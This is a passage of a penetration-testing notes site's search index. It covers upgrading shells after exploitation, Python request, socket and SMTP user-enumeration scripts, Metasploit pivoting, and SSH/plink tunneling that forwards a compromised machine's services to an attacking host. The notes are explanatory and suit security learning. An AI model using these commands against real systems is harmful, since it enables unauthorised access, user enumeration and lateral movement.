you won't have tab-completion. This might be really frustrating if you stay in that shell for long. It can also be more risky, if a execution gets stuck you cant use Ctr-C or Ctr-Z without killing your session. However that can be fixed using socat. Follow these instructions. https://github.com/cornerpirate/socat-shell References: # http://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password http://netsec.ws/?p=337 http://pentestmonkey.net/blog/post-exploitation-without-a-tty","title":"Spawning Shells"},{"location":"post_exploitation/spawning_shells/#spawning-shells","text":"","title":"Spawning shells"},{"location":"post_exploitation/spawning_shells/#non-interactive-tty-shell","text":"If you have a non-tty-shell there are certain commands and stuff you can't do. This can happen if you upload reverse shells on a webserver, so that the shell you get is by the user www-data, or similar. These users are not meant to have shells as they don't interact with the system has humans do. So if you don't have a tty-shell you can't run su , sudo for example. This can be annoying if you manage to get a root password but you can't use it. Anyways, if you get one of these shells you can upgrade it to a tty-shell using the following methods: Using python python -c 'import pty; pty.spawn(\"/bin/sh\")' Echo echo 'os.system('/bin/bash')' sh /bin/sh -i bash /bin/bash -i Perl perl -e 'exec \"/bin/sh\";' From within VI :!bash","title":"Non-interactive tty-shell"},{"location":"post_exploitation/spawning_shells/#interactive-tty-shell","text":"So if you manage to upgrade to a non-interactive tty-shell you will still have a limited shell. You won't be able to use the up and down arrows, you won't have tab-completion. This might be really frustrating if you stay in that shell for long. It can also be more risky, if a execution gets stuck you cant use Ctr-C or Ctr-Z without killing your session. However that can be fixed using socat. Follow these instructions. https://github.com/cornerpirate/socat-shell","title":"Interactive tty-shell"},{"location":"post_exploitation/spawning_shells/#references","text":"http://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password http://netsec.ws/?p=337 http://pentestmonkey.net/blog/post-exploitation-without-a-tty","title":"References:"},{"location":"python/python_fundamentals/","text":"Python fundamentals # Array/list # my_list = [1,\"string\",3,4,5] for item in my_list: print item # Append/push to list my_list.append(\"addMe\") Modules # Always good to modular your code. module1.py def addNumbers(numberOne, numberTwo): return numberOne + numberTwo script.py import module1 total = module1.addNumbers(1,2) print total Pip - package management # Pip is the python package manager. It ca be used to download other modules. Install pip sudo apt-get install python-pip To install package pip install package","title":"Python Fundamentals"},{"location":"python/python_fundamentals/#python-fundamentals","text":"","title":"Python fundamentals"},{"location":"python/python_fundamentals/#arraylist","text":"my_list = [1,\"string\",3,4,5] for item in my_list: print item # Append/push to list my_list.append(\"addMe\")","title":"Array/list"},{"location":"python/python_fundamentals/#modules","text":"Always good to modular your code. module1.py def addNumbers(numberOne, numberTwo): return numberOne + numberTwo script.py import module1 total = module1.addNumbers(1,2) print total","title":"Modules"},{"location":"python/python_fundamentals/#pip-package-management","text":"Pip is the python package manager. It ca be used to download other modules. Install pip sudo apt-get install python-pip To install package pip install package","title":"Pip - package management"},{"location":"python/useful_python_commands/","text":"Useful Scripts # Make Request # Sometimes we might want to make a request to a website programmatically. Instead of having to visit the page in the browser. In Python we can to it the following way. If you don't have the module requests installed you can install it like this. pip install requests import requests req = requests.get(\"http://site.com\") print req.status_code print req.text Custom headers # We might receive a 403 error if we don't include a user-agent. Or we might want to send a specific header. We can do that the following way. import requests headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, sdch\", \"Accept-Language\": \"en-US,en;q=0.8,es;q=0.6,sv;q=0.4\", \"Cache-Control\": \"max-age=0\", \"Connection\": \"keep-alive\", \"Cookie\": \"_gauges_unique_hour=1; _gauges_unique_day=1; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1\", \"Host\": \"docs.python-requests.org\", \"If-Modified-Since\": \"Wed, 03 Aug 2016 20:05:34 GMT\", \"If-None-Match\": 'W/\"57a24e8e-e1f3\"', \"Referer\": \"https://www.google.com/\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36\" } req = requests.get(\"http://site.com\", headers=headers) print req.status_code print req.text If you need to add an action, like loggin in or something like that, to your request you do the following: values = {'action' : 'whatever'} req = requests.get(\"http://site.com\", data=values, headers=headers) Here is the documentation http://docs.python-requests.org/en/master/user/quickstart/ Read and write to files # Many times we want to read through files and do stuff do it. This can of course be done using bash but we can also do it in python. It might be easier to parse text in python. file_open = open(\"readme.txt\", \"r\") for line in file_open: print line.strip(\"\\n\") if line.strip(\"\\n\") == \"rad 4\": print \"last line\" Send requests to your proxy (like Burp) # import os os.environ['HTTPS_PROXY'] = '<proxyurl>:<port>' # http://127.0.0.1:8080 if it is burp # Then you need to add verify=False requests.get(\"https://google.com\", headers=headers,verify=False) Basic banner-grabber # Here is an example of the most basic usage of the socket module. It connects to a port and prints out the response. #!/user/bin/env python # Importing the socket module import socket # We use the socker() method of the module socket and store it in the variable s. s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Here we use the connect method of the socket we created. The two arguments are pretty self-explanatory # The first is the adress the second is the port. s.connect((\"192.168.1.104\", 22)) # Here we save what the socket reviewed in the variable answer. answer = s.recv(1024) print answer # Send stuff. REMEMBER THE \\r\\n s.send(\"this is my message\\r\\n\") print s.recv(1024) # Here we close the socket. s.close If you need to check all 65535 ports this might take some time. If a packet is sent and recieved that makes it 65535 seconds, it translates into about 18 hours. So to solve that we can run the a function in new threads. from multiprocessing.dummy import Pool as ThreadPool pool = ThreadPool(300) results = pool.map(function, array) Read more about parallellism here: http://chriskiehl.com/article/parallelism-in-one-line/ Connecting to SMTP # A crappy script to connect to a smtp-server and if you are allowed to test for users with VRFY it goes ahead and test for the users that you input from a file. One very important thing to note here, that had me stuck for quite a while is that you need to send the query strings in raw-format The \\r here is fundamental!! s.send('VRFY root \\r\\n') #!/usr/bin/python import socket import sys import time import re ips = [ \"192.168.1.22\", \"192.168.1.72\" ] users = [\"root\"] userfile = open(\"/fileWithUsernames.txt\", \"r\") for line in userfile: user = line.strip(\"\\n\") users.append(user) for ip in ips: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, 25)) banner = s.recv(1024) print \"****************************\" print \"Report for \" + ip print banner s.send('VRFY root \\r\\n') answerUsername = s.recv(1024) answerAsArray = answerUsername.split(\" \") if answerAsArray[0] == \"502\": print \"VRFY failed\" if answerAsArray[0] == \"250\": print \"VRFY command succeeded.\\nProceeding to test usernames\" for username in users: time.sleep(5) s.send(\"VRFY \" + username + \"\\r\\n\") answerUsername = s.recv(1024) answerUsernameArray = answerUsername.split(\" \") print answerUsernameArray[0] if answerUsernameArray[0] == \"250\": print \"Exists: \" + username.strip(\"\\n\") else : print \"Does NOT exist: \" + username.strip(\"\\n\") if answerAsArray[0] == \"252\": print \"FAILED - Cannot verify user\" else: \"Some other error or whatever here it is: \\n\" + answerUsername s.close() Parsing html # Install beautifulsoup 4 sudo apt install python-bs4 import requests from bs4 import BeautifulSoup r = requests.get(\"https://google.com\") soup = BeautifulSoup(r.text, 'html.parser') print soup.find_all(\"title\") Client/Server using sockets # http://programmers.stackexchange.com/questions/171734/difference-between-a-socket-and-a-port","title":"Useful Scripts"},{"location":"python/useful_python_commands/#useful-scripts","text":"","title":"Useful Scripts"},{"location":"python/useful_python_commands/#make-request","text":"Sometimes we might want to make a request to a website programmatically. Instead of having to visit the page in the browser. In Python we can to it the following way. If you don't have the module requests installed you can install it like this. pip install requests import requests req = requests.get(\"http://site.com\") print req.status_code print req.text","title":"Make Request"},{"location":"python/useful_python_commands/#custom-headers","text":"We might receive a 403 error if we don't include a user-agent. Or we might want to send a specific header. We can do that the following way. import requests headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, sdch\", \"Accept-Language\": \"en-US,en;q=0.8,es;q=0.6,sv;q=0.4\", \"Cache-Control\": \"max-age=0\", \"Connection\": \"keep-alive\", \"Cookie\": \"_gauges_unique_hour=1; _gauges_unique_day=1; _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1\", \"Host\": \"docs.python-requests.org\", \"If-Modified-Since\": \"Wed, 03 Aug 2016 20:05:34 GMT\", \"If-None-Match\": 'W/\"57a24e8e-e1f3\"', \"Referer\": \"https://www.google.com/\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36\" } req = requests.get(\"http://site.com\", headers=headers) print req.status_code print req.text If you need to add an action, like loggin in or something like that, to your request you do the following: values = {'action' : 'whatever'} req = requests.get(\"http://site.com\", data=values, headers=headers) Here is the documentation http://docs.python-requests.org/en/master/user/quickstart/","title":"Custom headers"},{"location":"python/useful_python_commands/#read-and-write-to-files","text":"Many times we want to read through files and do stuff do it. This can of course be done using bash but we can also do it in python. It might be easier to parse text in python. file_open = open(\"readme.txt\", \"r\") for line in file_open: print line.strip(\"\\n\") if line.strip(\"\\n\") == \"rad 4\": print \"last line\"","title":"Read and write to files"},{"location":"python/useful_python_commands/#send-requests-to-your-proxy-40like-burp41","text":"import os os.environ['HTTPS_PROXY'] = '<proxyurl>:<port>' # http://127.0.0.1:8080 if it is burp # Then you need to add verify=False requests.get(\"https://google.com\", headers=headers,verify=False)","title":"Send requests to your proxy (like Burp)"},{"location":"python/useful_python_commands/#basic-banner-grabber","text":"Here is an example of the most basic usage of the socket module. It connects to a port and prints out the response. #!/user/bin/env python # Importing the socket module import socket # We use the socker() method of the module socket and store it in the variable s. s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Here we use the connect method of the socket we created. The two arguments are pretty self-explanatory # The first is the adress the second is the port. s.connect((\"192.168.1.104\", 22)) # Here we save what the socket reviewed in the variable answer. answer = s.recv(1024) print answer # Send stuff. REMEMBER THE \\r\\n s.send(\"this is my message\\r\\n\") print s.recv(1024) # Here we close the socket. s.close If you need to check all 65535 ports this might take some time. If a packet is sent and recieved that makes it 65535 seconds, it translates into about 18 hours. So to solve that we can run the a function in new threads. from multiprocessing.dummy import Pool as ThreadPool pool = ThreadPool(300) results = pool.map(function, array) Read more about parallellism here: http://chriskiehl.com/article/parallelism-in-one-line/","title":"Basic banner-grabber"},{"location":"python/useful_python_commands/#connecting-to-smtp","text":"A crappy script to connect to a smtp-server and if you are allowed to test for users with VRFY it goes ahead and test for the users that you input from a file. One very important thing to note here, that had me stuck for quite a while is that you need to send the query strings in raw-format The \\r here is fundamental!! s.send('VRFY root \\r\\n') #!/usr/bin/python import socket import sys import time import re ips = [ \"192.168.1.22\", \"192.168.1.72\" ] users = [\"root\"] userfile = open(\"/fileWithUsernames.txt\", \"r\") for line in userfile: user = line.strip(\"\\n\") users.append(user) for ip in ips: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, 25)) banner = s.recv(1024) print \"****************************\" print \"Report for \" + ip print banner s.send('VRFY root \\r\\n') answerUsername = s.recv(1024) answerAsArray = answerUsername.split(\" \") if answerAsArray[0] == \"502\": print \"VRFY failed\" if answerAsArray[0] == \"250\": print \"VRFY command succeeded.\\nProceeding to test usernames\" for username in users: time.sleep(5) s.send(\"VRFY \" + username + \"\\r\\n\") answerUsername = s.recv(1024) answerUsernameArray = answerUsername.split(\" \") print answerUsernameArray[0] if answerUsernameArray[0] == \"250\": print \"Exists: \" + username.strip(\"\\n\") else : print \"Does NOT exist: \" + username.strip(\"\\n\") if answerAsArray[0] == \"252\": print \"FAILED - Cannot verify user\" else: \"Some other error or whatever here it is: \\n\" + answerUsername s.close()","title":"Connecting to SMTP"},{"location":"python/useful_python_commands/#parsing-html","text":"Install beautifulsoup 4 sudo apt install python-bs4 import requests from bs4 import BeautifulSoup r = requests.get(\"https://google.com\") soup = BeautifulSoup(r.text, 'html.parser') print soup.find_all(\"title\")","title":"Parsing html"},{"location":"python/useful_python_commands/#clientserver-using-sockets","text":"http://programmers.stackexchange.com/questions/171734/difference-between-a-socket-and-a-port","title":"Client/Server using sockets"},{"location":"random_tips_and_tricks/general_tips/","text":"General tips # Disposable email # If you are signing up for a lot of accounts you can use a disposable email. You just enter the email account you want for that second, and then you can view it. But remember, so can everyone else. https://www.mailinator.com Base64 encode/decode # import base64 encoded = base64.b64encode(\"String to encode\") print encoded decoded = base64.b64decode(\"aGVqc2Fu\") print decoded Default passwords # http://www.defaultpassword.com/","title":"Tips and Tricks"},{"location":"random_tips_and_tricks/general_tips/#general-tips","text":"","title":"General tips"},{"location":"random_tips_and_tricks/general_tips/#disposable-email","text":"If you are signing up for a lot of accounts you can use a disposable email. You just enter the email account you want for that second, and then you can view it. But remember, so can everyone else. https://www.mailinator.com","title":"Disposable email"},{"location":"random_tips_and_tricks/general_tips/#base64-encodedecode","text":"import base64 encoded = base64.b64encode(\"String to encode\") print encoded decoded = base64.b64decode(\"aGVqc2Fu\") print decoded","title":"Base64 encode/decode"},{"location":"random_tips_and_tricks/general_tips/#default-passwords","text":"http://www.defaultpassword.com/","title":"Default passwords"},{"location":"random_tips_and_tricks/pivoting/","text":"Pivoting # Let's say that you have compromised one machine on a network and you want to keep going to another machine. You will use the first machine as a staging point/plant/foothold to break into machine 2. Thid technique of using one compromised machine to access another is called pivoting. Machine one is the pivot in the example. The pivot is just used as a way to channel/tunnel our attack. Ipconfig # We are looking for machines that have at least THREE network interfaces (loopback, eth0, and eth1 (or something)). These machines are connected to other networks, so we can use them to pivot. # Windows ipconfig /all route print #Linux ifconfig ifconfig -a Metasploit # Ping-sweep the network # First we want to scan the network to see what devices we can target. In this example we already have a meterpreter shell on a windows machine with SYSTEM-privileges. meterpreter > run arp_scanner -r 192.168.1.0/24 This command will output all the devices on the netowork. Scan each host # Now that we have a list of all available machines. We want to portscan them. We will to that portscan through metasploit. Using this module: use auxiliary/scanner/portscan/tcp If we run that module now it will only scan machines in the network we are already on. So first we need to connect us into the second network. On the already pwn machine we do ipconfig Now we add the second network as a new route in metasploit. First we background our session, and then do this: # the ip addres and the subnet mask, and then the meterpreter session route add 192.168.11.1 255.255.255.0 1 Now we can run our portsanning module: use auxiliary/scanner/portscan/tcp Attack a specific port # In order to attack a specific port we need to forwards it like this portfwd add -l 3389 -p 3389 -r 192.168.1.222 This is a good video-explanation: https://www.youtube.com/watch?v=c0XiaNAkjJA https://www.offensive-security.com/metasploit-unleashed/pivoting/ http://ways2hack.com/how-to-do-pivoting-attack/","title":"Pivoting"},{"location":"random_tips_and_tricks/pivoting/#pivoting","text":"Let's say that you have compromised one machine on a network and you want to keep going to another machine. You will use the first machine as a staging point/plant/foothold to break into machine 2. Thid technique of using one compromised machine to access another is called pivoting. Machine one is the pivot in the example. The pivot is just used as a way to channel/tunnel our attack.","title":"Pivoting"},{"location":"random_tips_and_tricks/pivoting/#ipconfig","text":"We are looking for machines that have at least THREE network interfaces (loopback, eth0, and eth1 (or something)). These machines are connected to other networks, so we can use them to pivot. # Windows ipconfig /all route print #Linux ifconfig ifconfig -a","title":"Ipconfig"},{"location":"random_tips_and_tricks/pivoting/#metasploit","text":"","title":"Metasploit"},{"location":"random_tips_and_tricks/pivoting/#ping-sweep-the-network","text":"First we want to scan the network to see what devices we can target. In this example we already have a meterpreter shell on a windows machine with SYSTEM-privileges. meterpreter > run arp_scanner -r 192.168.1.0/24 This command will output all the devices on the netowork.","title":"Ping-sweep the network"},{"location":"random_tips_and_tricks/pivoting/#scan-each-host","text":"Now that we have a list of all available machines. We want to portscan them. We will to that portscan through metasploit. Using this module: use auxiliary/scanner/portscan/tcp If we run that module now it will only scan machines in the network we are already on. So first we need to connect us into the second network. On the already pwn machine we do ipconfig Now we add the second network as a new route in metasploit. First we background our session, and then do this: # the ip addres and the subnet mask, and then the meterpreter session route add 192.168.11.1 255.255.255.0 1 Now we can run our portsanning module: use auxiliary/scanner/portscan/tcp","title":"Scan each host"},{"location":"random_tips_and_tricks/pivoting/#attack-a-specific-port","text":"In order to attack a specific port we need to forwards it like this portfwd add -l 3389 -p 3389 -r 192.168.1.222 This is a good video-explanation: https://www.youtube.com/watch?v=c0XiaNAkjJA https://www.offensive-security.com/metasploit-unleashed/pivoting/ http://ways2hack.com/how-to-do-pivoting-attack/","title":"Attack a specific port"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/","text":"Pivoting # Let's say that you have compromised one machine on a network and you want to keep going to another machine. You will use the first machine as a staging point/plant/foothold to break into machine 2. The technique of using one compromised machine to access another is called pivoting. Machine one is the pivot in the example. The pivot is just used as a way to channel/tunnel our attack. Ipconfig # We are looking for machines that have at least THREE network interfaces (loopback, eth0, and eth1 (or something)). These machines are connected to other networks, so we can use them to pivot. # Windows ipconfig /all route print #Linux ifconfig ifconfig -a Port forwarding and tunneling # Port forwarding # So imagine that you are on a network and you want to connect to a ftp server (or any other port) to upload or download some files. But someone has put some crazy firewall rules (egress filters) that prohibits outgoing traffics on all ports except for port 80. So how are we going to be able to connect to our ftp-server? What we can do is add a machine that redirect/forward all traffic that it receives on port 80 to port 21 on a different machine. So instead of having this kind of traffic home-computer/port-21 ----> ftp-server/port-21 we will have home-computer/port-80 ----> port-80/proxy-machine/port-21 ----> ftp-server And the other way around of course, to receive the traffic. Okay, so how do we go about actually implementing this? Rinetd - Port forward/redirect # So we can set up this port forwarding machine with the help of rinetd. To make it clear, we have the following machines: Machine1 - IP: 111.111.111.111 - Behind firewall, and wants to connect to Machine3. Machine2 - IP: 222.222.222.222 - Forwards incomming connections to Machine3 Machine3 - IP: 333.333.333.333 - Hosts the ftp-server that machine1 wants to connect to. apt-get install rinetd This is the default config file /etc/rinetd.conf : # # this is the configuration file for rinetd, the internet redirection server # # you may specify global allow and deny rules here # only ip addresses are matched, hostnames cannot be specified here # the wildcards you may use are * and ? # # allow 192.168.2.* # deny 192.168.2.1? # # forwarding rules come here # # you may specify allow and deny rules after a specific forwarding rule # to apply to only that forwarding rule # # bindadress bindport connectaddress connectport # logging information logfile /var/log/rinetd.log # uncomment the following line if you want web-server style logfile format # logcommon This is the essential part of the configuration file, this is where we create the port-forwarding # bindadress bindport connectaddress connectport 111.111.111.111 80 333.333.333.333 21 /etc/init.d/rinetd restart So the bind-address is where the proxy receieves the connection, and the connectaddress is the machine it forwards the connection to. SSH Tunneling - Port forwarding on SSH # Use cases - You want to encrypt traffic that uses unencrypted protocols. Like VNC, IMAP, IRC. - You are on a public network and want to encrypt all your http traffic. - You want to bypass firewall rules. Local port forwarding # Now facebook will be available on address localhost:8080. ssh -L 8080:www.facebook.com:80 localhost You can also forward ports like this: ssh username@<remote-machine> -L localport:target-ip:target-port ssh username@192.168.1.111 -L 5000:192.168.1.222:5000 Now this port will be available on your localhost. So you go to: nc localhost:10000 Remote port forwarding # Remote port forwarding is crazy, yet very simple concept. So imagine that you have compromised a machine, and that machine has like MYSQL running but it is only accessible for localhost. And you can't access it because you have a really crappy shell. So what we can do is just forward that port to our attacking machine. The steps are as following: Here is how you create a remote port forwarding: ssh <gateway> -R <remote port to bind>:<local host>:<local port> By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the attacking machine is 111.111.111.111 . Step 1 So on our compromised machine we do: plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306 Step 2 Now we can check netstat on our attacking machine, we should see something like this: tcp 0 0 127.0.0.1:3307 0.0.0.0:* LISTEN 19392/sshd: root@pt That means what we can connect to that port on the attacking machine from the attacking machine. Step 3 Connect using the following command: mysql -u root -p -h 127.0.0.1 --port=3307 Dynamic port forwarding # This can be used to dynamically forward all traffic from a specific application. This is really cool. With remote and local port forwarding you are only forwarding a single port. But that can be a hassle if your target machine has 10 ports open that you want to connect to. So instad we can use a dynamic port forwarding technique. Dynamic port forwarding sounds really complicated, but it is incredibly easy to set up. Just set up the tunnel like this. After it is set up do not run any commands in that session. # We connect to the machine we want to pivot from ssh -D 9050 user@192.168.1.111 Since proxychains uses 9050 by defualt (the default port for tor) we don't even need to configure proxychains. But if you want to change the port you can do that in /etc/proxychains.conf . proxychains nc 192.168.2.222 21 So supress all the logs from proxychains you can configure it in the config file. Tunnel all http/https traffic through ssh # For this we need two machines. Machine1 - 111.111.1111.111 - The server that works as our proxy. Machine2 - The computer with the web browser. First we check out what out public IP adress is, so that we know the IP address before and after, so we can verify that it works. First you set ssh to: # On Machine2 we run ssh -D localhost:9999 root@111.111.111.111 # Can also be run with the -N flag ssh -D localhost:9999 root@111.111.111.111 -N Now you go to Firefox/settings/advanced/network and SOCKS you add 127.0.0.1 and port 9999 Notice that this setup probably leaks DNS. So don't use it if you need opsec. To fix the DNS-leak you can go to about:config in firefox (in the addressbar) then look for network.proxy.socks_remote_dns , and switch it to TRUE . Now you can check: https://ipleak.net/ But we are not done yet. It still says that we have WebRTC leaks . In order to solve this you can go to about:config again and set the following to FALSE media.peerconnection.enabled SShuttle # I haven't used this, but it might work. sshuttle -r root@192.168.1.101 192.168.1.0/24 Port forward with metasploit # We can also forward ports using metasploit. Say that the compromised machine is running services that are only accessible from within the network, from within that machine. To access that port we can do this in meterpreter: portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.222 Now we can access this port on our machine locally like this. nc 127.0.0.1 3306 Ping-sweep the network # First we want to scan the network to see what devices we can target. In this example we already have a meterpreter shell on a windows machine with SYSTEM-privileges. meterpreter > run arp_scanner -r 192.168.1.0/24 This command will output all the devices on the netowork. Scan each host # Now that we have a list of all available machines. We want to portscan them. We will to that portscan through metasploit. Using this module: use auxiliary/scanner/portscan/tcp If we run that module now it will only scan machines in the network we are already on. So first we need to connect us into the second network. On the already pwn machine we do ipconfig Now we add the second network as a new route in metasploit. First we background our session, and then do this: # the ip addres and the subnet mask, and then the meterpreter session route add 192.168.1.101 255.255.255.0 1 Now we can run our portscanning module: use auxiliary/scanner/portscan/tcp Attack a specific port # In order to attack a specific port we need to forwards it like this portfwd add -l 3389 -p 3389 -r 192.168.1.222 References # This is a good video-explanation: https://www.youtube.com/watch?v=c0XiaNAkjJA https://www.offensive-security.com/metasploit-unleashed/pivoting/ http://ways2hack.com/how-to-do-pivoting-attack/","title":"Port Forwarding and Tunneling"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#pivoting","text":"Let's say that you have compromised one machine on a network and you want to keep going to another machine. You will use the first machine as a staging point/plant/foothold to break into machine 2. The technique of using one compromised machine to access another is called pivoting. Machine one is the pivot in the example. The pivot is just used as a way to channel/tunnel our attack.","title":"Pivoting"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#ipconfig","text":"We are looking for machines that have at least THREE network interfaces (loopback, eth0, and eth1 (or something)). These machines are connected to other networks, so we can use them to pivot. # Windows ipconfig /all route print #Linux ifconfig ifconfig -a","title":"Ipconfig"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#port-forwarding-and-tunneling","text":"","title":"Port forwarding and tunneling"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#port-forwarding","text":"So imagine that you are on a network and you want to connect to a ftp server (or any other port) to upload or download some files. But someone has put some crazy firewall rules (egress filters) that prohibits outgoing traffics on all ports except for port 80. So how are we going to be able to connect to our ftp-server? What we can do is add a machine that redirect/forward all traffic that it receives on port 80 to port 21 on a different machine. So instead of having this kind of traffic home-computer/port-21 ----> ftp-server/port-21 we will have home-computer/port-80 ----> port-80/proxy-machine/port-21 ----> ftp-server And the other way around of course, to receive the traffic. Okay, so how do we go about actually implementing this?","title":"Port forwarding"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#rinetd-port-forwardredirect","text":"So we can set up this port forwarding machine with the help of rinetd. To make it clear, we have the following machines: Machine1 - IP: 111.111.111.111 - Behind firewall, and wants to connect to Machine3. Machine2 - IP: 222.222.222.222 - Forwards incomming connections to Machine3 Machine3 - IP: 333.333.333.333 - Hosts the ftp-server that machine1 wants to connect to. apt-get install rinetd This is the default config file /etc/rinetd.conf : # # this is the configuration file for rinetd, the internet redirection server # # you may specify global allow and deny rules here # only ip addresses are matched, hostnames cannot be specified here # the wildcards you may use are * and ? # # allow 192.168.2.* # deny 192.168.2.1? # # forwarding rules come here # # you may specify allow and deny rules after a specific forwarding rule # to apply to only that forwarding rule # # bindadress bindport connectaddress connectport # logging information logfile /var/log/rinetd.log # uncomment the following line if you want web-server style logfile format # logcommon This is the essential part of the configuration file, this is where we create the port-forwarding # bindadress bindport connectaddress connectport 111.111.111.111 80 333.333.333.333 21 /etc/init.d/rinetd restart So the bind-address is where the proxy receieves the connection, and the connectaddress is the machine it forwards the connection to.","title":"Rinetd - Port forward/redirect"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#ssh-tunneling-port-forwarding-on-ssh","text":"Use cases - You want to encrypt traffic that uses unencrypted protocols. Like VNC, IMAP, IRC. - You are on a public network and want to encrypt all your http traffic. - You want to bypass firewall rules.","title":"SSH Tunneling - Port forwarding on SSH"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#local-port-forwarding","text":"Now facebook will be available on address localhost:8080. ssh -L 8080:www.facebook.com:80 localhost You can also forward ports like this: ssh username@<remote-machine> -L localport:target-ip:target-port ssh username@192.168.1.111 -L 5000:192.168.1.222:5000 Now this port will be available on your localhost. So you go to: nc localhost:10000","title":"Local port forwarding"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#remote-port-forwarding","text":"Remote port forwarding is crazy, yet very simple concept. So imagine that you have compromised a machine, and that machine has like MYSQL running but it is only accessible for localhost. And you can't access it because you have a really crappy shell. So what we can do is just forward that port to our attacking machine. The steps are as following: Here is how you create a remote port forwarding: ssh <gateway> -R <remote port to bind>:<local host>:<local port> By the way, plink is a ssh-client for windows that can be run from the terminal. The ip of the attacking machine is 111.111.111.111 . Step 1 So on our compromised machine we do: plink.exe -l root -pw mysecretpassword 111.111.111.111 -R 3307:127.0.0.1:3306 Step 2 Now we can check netstat on our attacking machine, we should see something like this: tcp 0 0 127.0.0.1:3307 0.0.0.0:* LISTEN 19392/sshd: root@pt That means what we can connect to that port on the attacking machine from the attacking machine. Step 3 Connect using the following command: mysql -u root -p -h 127.0.0.1 --port=3307","title":"Remote port forwarding"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#dynamic-port-forwarding","text":"This can be used to dynamically forward all traffic from a specific application. This is really cool. With remote and local port forwarding you are only forwarding a single port. But that can be a hassle if your target machine has 10 ports open that you want to connect to. So instad we can use a dynamic port forwarding technique. Dynamic port forwarding sounds really complicated, but it is incredibly easy to set up. Just set up the tunnel like this. After it is set up do not run any commands in that session. # We connect to the machine we want to pivot from ssh -D 9050 user@192.168.1.111 Since proxychains uses 9050 by defualt (the default port for tor) we don't even need to configure proxychains. But if you want to change the port you can do that in /etc/proxychains.conf . proxychains nc 192.168.2.222 21 So supress all the logs from proxychains you can configure it in the config file.","title":"Dynamic port forwarding"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#tunnel-all-httphttps-traffic-through-ssh","text":"For this we need two machines. Machine1 - 111.111.1111.111 - The server that works as our proxy. Machine2 - The computer with the web browser. First we check out what out public IP adress is, so that we know the IP address before and after, so we can verify that it works. First you set ssh to: # On Machine2 we run ssh -D localhost:9999 root@111.111.111.111 # Can also be run with the -N flag ssh -D localhost:9999 root@111.111.111.111 -N Now you go to Firefox/settings/advanced/network and SOCKS you add 127.0.0.1 and port 9999 Notice that this setup probably leaks DNS. So don't use it if you need opsec. To fix the DNS-leak you can go to about:config in firefox (in the addressbar) then look for network.proxy.socks_remote_dns , and switch it to TRUE . Now you can check: https://ipleak.net/ But we are not done yet. It still says that we have WebRTC leaks . In order to solve this you can go to about:config again and set the following to FALSE media.peerconnection.enabled","title":"Tunnel all http/https traffic through ssh"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#sshuttle","text":"I haven't used this, but it might work. sshuttle -r root@192.168.1.101 192.168.1.0/24","title":"SShuttle"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#port-forward-with-metasploit","text":"We can also forward ports using metasploit. Say that the compromised machine is running services that are only accessible from within the network, from within that machine. To access that port we can do this in meterpreter: portfwd add -l <attacker port> -p <victim port> -r <victim ip> portfwd add -l 3306 -p 3306 -r 192.168.222 Now we can access this port on our machine locally like this. nc 127.0.0.1 3306","title":"Port forward with metasploit"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#ping-sweep-the-network","text":"First we want to scan the network to see what devices we can target. In this example we already have a meterpreter shell on a windows machine with SYSTEM-privileges. meterpreter > run arp_scanner -r 192.168.1.0/24 This command will output all the devices on the netowork.","title":"Ping-sweep the network"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#scan-each-host","text":"Now that we have a list of all available machines. We want to portscan them. We will to that portscan through metasploit. Using this module: use auxiliary/scanner/portscan/tcp If we run that module now it will only scan machines in the network we are already on. So first we need to connect us into the second network. On the already pwn machine we do ipconfig Now we add the second network as a new route in metasploit. First we background our session, and then do this: # the ip addres and the subnet mask, and then the meterpreter session route add 192.168.1.101 255.255.255.0 1 Now we can run our portscanning module: use auxiliary/scanner/portscan/tcp","title":"Scan each host"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#attack-a-specific-port","text":"In order to attack a specific port we need to forwards it like this portfwd add -l 3389 -p 3389 -r 192.168.1.222","title":"Attack a specific port"},{"location":"random_tips_and_tricks/port_forwarding_and_tunneling/#references","text":"This is a good video-explanation: https://www.youtube.com/watch?v=c0XiaNAkjJA https://www.offensive-security.com/metasploit-unleashed/pivoting/ http://ways2hack.com/how-to-do-pivoting-attack/","title":"References"},{"location":"random_tips_and_tricks/port_knocking/","text":"Port knocking # Port-knocking the a obfuscation-as-security technique. It basically means that after knocking on ports in a 